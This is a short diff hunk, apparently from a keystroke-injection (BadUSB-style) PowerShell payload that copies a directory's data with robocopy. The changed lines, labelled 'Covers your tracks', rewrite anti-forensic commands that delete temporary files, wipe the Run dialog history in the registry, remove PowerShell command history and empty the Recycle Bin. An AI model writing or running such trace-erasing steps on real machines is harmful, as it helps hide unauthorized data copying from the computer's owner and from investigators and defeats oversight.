@@ -36,7 +36,10 @@ Write-Host "[*] Copying data to $destDir ..." -ForegroundColor Yellow
 robocopy "$sourceDir" "$destDir" /E /R:2 /W:2
 
 # 6. Covers your tracks by deleting anything you might have left on the System.
-STRING rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue; reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f; Remove-Item (Get-PSreadlineOption).HistorySavePath -ErrorAction SilentlyContinue; Clear-RecycleBin -Force -ErrorAction SilentlyContinue
+Remove-Item "$env:TEMP\*" -Recurse -Force -ErrorAction SilentlyContinue
+reg delete "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /va /f
+Remove-Item (Get-PSReadLineOption).HistorySavePath -ErrorAction SilentlyContinue
+Clear-RecycleBin -Force -ErrorAction SilentlyContinue
 ENTER
 
 Write-Host "[+] Copy process completed!" -ForegroundColor Green
